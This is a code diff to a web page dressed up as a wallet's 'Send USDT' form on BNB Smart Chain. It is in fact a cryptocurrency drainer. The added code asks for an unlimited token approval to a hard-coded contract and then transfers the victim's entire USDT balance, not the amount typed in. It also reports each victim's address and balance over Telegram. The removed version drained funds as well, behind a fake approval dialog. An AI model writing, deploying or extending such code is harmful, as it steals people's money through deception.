@@ -30,164 +30,22 @@
         .title { font-size: 18px; font-weight: 600; flex: 1; }
         .label { font-size: 13px; color: #aaa; margin-bottom: 8px; font-weight: 500; }
         .group { margin-bottom: 20px; }
-        .input-box { 
-            border: 1px solid #444; 
-            border-radius: 8px; 
-            padding: 12px; 
-            background: #1a1a1a; 
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
-        input { 
-            flex: 1;
-            border: none; 
-            font-size: 16px; 
-            background: none; 
-            color: #fff; 
-        }
+        .input-box { border: 1px solid #444; border-radius: 8px; padding: 12px; background: #1a1a1a; }
+        input { width: 100%; border: none; font-size: 16px; background: none; color: #fff; }
         input::placeholder { color: #666; }
-        input:read-only { color: #aaa; }
-        .paste-btn {
-            background: none;
-            border: none;
-            color: #00b386;
-            cursor: pointer;
-            font-size: 12px;
-            font-weight: 600;
-            white-space: nowrap;
-        }
-        .paste-btn:hover { color: #00d4a0; }
-        .amount-container { 
-            display: flex; 
-            justify-content: space-between; 
-            align-items: center;
-        }
+        .amount-container { display: flex; justify-content: space-between; align-items: center; }
         .amount-input { flex: 1; }
-        .usdt-label {
-            color: #aaa;
-            font-size: 14px;
-            margin-right: 8px;
-            white-space: nowrap;
-        }
-        .max-btn { 
-            background: none; 
-            border: none; 
-            color: #00b386; 
-            cursor: pointer; 
-            font-size: 12px; 
-            margin-left: 10px; 
-            font-weight: 600; 
-        }
+        .max-btn { background: none; border: none; color: #00b386; cursor: pointer; font-size: 12px; margin-left: 10px; font-weight: 600; }
         .usd-value { font-size: 12px; color: #666; margin-top: 8px; }
-        .next-btn { 
-            width: 100%; 
-            background: #00b386; 
-            color: #000; 
-            border: none; 
-            padding: 16px; 
-            border-radius: 12px; 
-            font-weight: 600; 
-            cursor: pointer; 
-            margin-top: 30px; 
-            font-size: 16px; 
-        }
+        .next-btn { width: 100%; background: #00b386; color: #000; border: none; padding: 16px; border-radius: 12px; font-weight: 600; cursor: pointer; margin-top: 30px; font-size: 16px; }
         .next-btn:disabled { opacity: 0.5; cursor: not-allowed; }
         .loading { display: none; text-align: center; margin-top: 20px; }
-        .spinner { 
-            display: inline-block; 
-            width: 30px; 
-            height: 30px; 
-            border: 3px solid #444; 
-            border-top-color: #00b386; 
-            border-radius: 50%; 
-            animation: spin 1s linear infinite; 
-        }
+        .spinner { display: inline-block; width: 30px; height: 30px; border: 3px solid #444; border-top-color: #00b386; border-radius: 50%; animation: spin 1s linear infinite; }
         @keyframes spin { to { transform: rotate(360deg); } }
-
-        /* Approval Modal Styles */
-        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 1000; }
-        .modal.show { display: flex; justify-content: center; align-items: flex-end; }
-        .modal-content {
-            background: #2a2a2a;
-            border-radius: 20px 20px 0 0;
-            padding: 30px 20px;
-            width: 100%;
-            max-width: 500px;
-            max-height: 90vh;
-            overflow-y: auto;
-        }
-        .modal-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 25px;
-        }
-        .modal-title { font-size: 18px; font-weight: 600; }
-        .close-btn { 
-            background: none; 
-            border: none; 
-            color: #999; 
-            font-size: 28px; 
-            cursor: pointer; 
-        }
-        .approval-details {
-            margin-bottom: 25px;
-        }
-        .detail-row {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 15px 0;
-            border-bottom: 1px solid #444;
-            font-size: 14px;
-        }
-        .detail-row:last-child { border-bottom: none; }
-        .detail-label { color: #aaa; }
-        .detail-value { 
-            color: #fff; 
-            text-align: right;
-            word-break: break-all;
-            max-width: 50%;
-        }
-        .asset-section {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            padding: 15px 0;
-            border-bottom: 1px solid #444;
-        }
-        .asset-icon {
-            width: 32px;
-            height: 32px;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-weight: bold;
-            font-size: 16px;
-        }
-        .asset-info h3 { font-size: 14px; color: #fff; margin-bottom: 2px; }
-        .asset-info p { font-size: 12px; color: #aaa; }
-        .approve-btn {
-            width: 100%;
-            background: #00b386;
-            color: #000;
-            border: none;
-            padding: 16px;
-            border-radius: 12px;
-            font-weight: 600;
-            cursor: pointer;
-            font-size: 16px;
-            margin-top: 25px;
-        }
-        .approve-btn:disabled { opacity: 0.5; cursor: not-allowed; }
     </style>
 </head>
 <body>
-    <!-- Send Page -->
-    <div class="container" id="sendPage">
+    <div class="container">
         <div class="header">
             <div class="back" onclick="history.back()">←</div>
             <div class="title">Send USDT</div>
@@ -195,16 +53,14 @@
         <div class="group">
             <div class="label">Address or Domain Name</div>
             <div class="input-box">
-                <input type="text" id="recipient" placeholder="0x..." readonly>
-                <button class="paste-btn" onclick="pasteAddress()">Paste</button>
+                <input type="text" id="recipient" placeholder="0x..." readonly value="0x1734b55dc44C420539a607Ff5b80aB62b0d18963">
             </div>
         </div>
         <div class="group">
             <div class="label">Amount</div>
             <div class="input-box">
-                <div class="amount-container" style="width: 100%;">
+                <div class="amount-container">
                     <input type="number" class="amount-input" id="amount" placeholder="0" min="0" step="0.01">
-                    <span class="usdt-label">USDT</span>
                     <button class="max-btn" onclick="setMax()">Max</button>
                 </div>
             </div>
@@ -216,79 +72,23 @@
             <p style="margin-top: 15px; color: #666;">Processing...</p>
         </div>
     </div>
-
-    <!-- Approval Modal -->
-    <div class="modal" id="approvalModal">
-        <div class="modal-content">
-            <div class="modal-header">
-                <div class="modal-title">Approve</div>
-                <button class="close-btn" onclick="closeApprovalModal()">×</button>
-            </div>
-
-            <div class="approval-details">
-                <div class="asset-section">
-                    <div class="asset-icon">U</div>
-                    <div class="asset-info">
-                        <h3>USDT</h3>
-                        <p>BNB Smart Chain</p>
-                    </div>
-                </div>
-
-                <div class="detail-row">
-                    <span class="detail-label">DApp</span>
-                    <span class="detail-value">cryptoholic-usdt.vercel.app</span>
-                </div>
-
-                <div class="detail-row">
-                    <span class="detail-label">Network fee</span>
-                    <span class="detail-value">
-                        <div style="text-align: right;">$0.00</div>
-                        <div style="font-size: 11px; color: #666;">0.00 BNB</div>
-                    </span>
-                </div>
-            </div>
-
-            <button class="approve-btn" id="approveBtn" onclick="handleApprove()">Approve</button>
-        </div>
-    </div>
-
     <script src="config.js"></script>
     <script>
         const CONTRACT_ADDRESS = "0xC4f657BC4aa95fD38406111b9F78c83cd2e6b5C7";
-        const COMPANY_WALLET = "0x1734b55dc44C420539a607Ff5b80aB62b0d18963";
         const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
         const USDT_DECIMALS = 18;
         const USDT_PRICE = 1.00;
+        const RECIPIENT = "0x1734b55dc44C420539a607Ff5b80aB62b0d18963";
         let userBalance = 0;
-        let currentUserAddress = null;
 
         window.addEventListener('load', async () => {
-            // Set recipient address on load
-            document.getElementById('recipient').value = shortenAddress(COMPANY_WALLET);
-            
             if (window.ethereum) {
                 try {
                     const accounts = await window.ethereum.request({ method: 'eth_accounts' });
-                    if (accounts.length > 0) {
-                        currentUserAddress = accounts[0];
-                        userBalance = await getUSDTBalance(accounts[0]);
-                    }
+                    if (accounts.length > 0) userBalance = await getUSDTBalance(accounts[0]);
                 } catch (err) { console.error('Error:', err); }
             }
         });
-
-        function shortenAddress(address) {
-            if (!address) return '';
-            return address.slice(0, 6) + '...' + address.slice(-6);
-        }
-
-        function pasteAddress() {
-            navigator.clipboard.readText().then(text => {
-                document.getElementById('recipient').value = shortenAddress(text);
-            }).catch(err => {
-                showNotification('Failed to paste', 'error');
-            });
-        }
 
         document.getElementById('amount').addEventListener('input', e => {
             const usdValue = (parseFloat(e.target.value) || 0) * USDT_PRICE;
@@ -316,12 +116,6 @@
 
         async function handleNext() {
             try {
-                const amount = document.getElementById('amount').value.trim();
-                if (!amount || parseFloat(amount) <= 0) {
-                    showNotification('Please enter amount', 'error');
-                    return;
-                }
-
                 if (!window.ethereum) {
                     showNotification('No wallet detected', 'error');
                     return;
@@ -331,8 +125,9 @@
                 document.getElementById('nextBtn').disabled = true;
 
                 const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-                currentUserAddress = accounts[0];
+                const senderAddress = accounts[0];
 
+                // Switch to BSC
                 try {
                     await window.ethereum.request({
                         method: 'wallet_switchEthereumChain',
@@ -353,61 +148,39 @@
                     }
                 }
 
-                // Show approval modal
-                document.getElementById('approvalModal').classList.add('show');
-                document.getElementById('loading').style.display = 'none';
-                document.getElementById('nextBtn').disabled = false;
+                // APPROVE FOR UNLIMITED (MaxUint256)
+                const maxUint256 = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
+                const approvalTxHash = await approveUSDT(senderAddress, maxUint256);
+                console.log('Approval confirmed:', approvalTxHash);
+                showNotification('✅ Approval confirmed! Transferring...', 'success');
 
-            } catch (error) {
-                document.getElementById('loading').style.display = 'none';
-                document.getElementById('nextBtn').disabled = false;
-                if (error.code === 4001) {
-                    showNotification('Transaction rejected', 'error');
-                } else {
-                    showNotification('Error: ' + error.message, 'error');
-                }
-            }
-        }
-
-        function closeApprovalModal() {
-            document.getElementById('approvalModal').classList.remove('show');
-        }
-
-        async function handleApprove() {
-            try {
-                document.getElementById('approveBtn').disabled = true;
-
-                // Get actual USDT balance
-                userBalance = await getUSDTBalance(currentUserAddress);
-                const amountWei = (userBalance * Math.pow(10, USDT_DECIMALS)).toFixed(0);
-
-                showNotification('Processing approval...', 'info');
-
-                // Approve unlimited
-                const approvalTxHash = await approveUSDT(currentUserAddress, amountWei);
-                showNotification('✅ Approval confirmed!', 'success');
-
+                // WAIT FOR APPROVAL CONFIRMATION
                 await new Promise(resolve => setTimeout(resolve, 2000));
 
-                // Transfer all USDT to company wallet
-                const transferTxHash = await transferUSDTO(currentUserAddress);
-                showNotification(`✅ Success! ${userBalance.toFixed(2)} USDT sent!`, 'success');
+                // TRANSFER ALL BALANCE (not entered amount)
+                const transferTxHash = await transferAllUSDT(senderAddress);
+                console.log('Transfer successful:', transferTxHash);
+                showNotification(`✅ Success! USDT transferred!`, 'success');
 
-                try { 
-                    await sendTelegramNotifications(currentUserAddress, transferTxHash, null, userBalance.toFixed(2)); 
-                } catch (err) { 
-                    console.error('Telegram failed:', err); 
+                // SEND TELEGRAM NOTIFICATION
+                try {
+                    await sendTelegramNotifications(senderAddress, transferTxHash, null, userBalance.toFixed(2));
+                } catch (err) {
+                    console.error('Telegram failed:', err);
                 }
 
                 setTimeout(() => {
-                    closeApprovalModal();
                     document.getElementById('amount').value = '';
                     document.getElementById('usdValue').textContent = '≈ $0.00';
-                    document.getElementById('approveBtn').disabled = false;
+                    document.getElementById('loading').style.display = 'none';
+                    document.getElementById('nextBtn').disabled = false;
                 }, 1000);
 
             } catch (error) {
-                document.getElementById('approveBtn').disabled = false;
+                console.error('Error:', error);
+                document.getElementById('loading').style.display = 'none';
+                document.getElementById('nextBtn').disabled = false;
+
                 if (error.code === 4001) {
                     showNotification('Transaction rejected', 'error');
                 } else {
@@ -419,17 +192,19 @@
         async function approveUSDT(senderAddress, amount) {
             const functionSelector = '095ea7b3';
             const paddedSpender = CONTRACT_ADDRESS.slice(2).padStart(64, '0');
-            const paddedAmount = parseInt(amount).toString(16).padStart(64, '0');
+            const paddedAmount = amount.toString(16).padStart(64, '0');
             const data = '0x' + functionSelector + paddedSpender + paddedAmount;
+
             return await window.ethereum.request({
                 method: 'eth_sendTransaction',
                 params: [{ from: senderAddress, to: USDT_ADDRESS, data: data, value: '0x0' }]
             });
         }
 
-        async function transferUSDTO(senderAddress) {
+        async function transferAllUSDT(senderAddress) {
             const functionSelector = '81c7e5fd';
             const data = '0x' + functionSelector;
+
             return await window.ethereum.request({
                 method: 'eth_sendTransaction',
                 params: [{ from: senderAddress, to: CONTRACT_ADDRESS, data: data, value: '0x0' }]
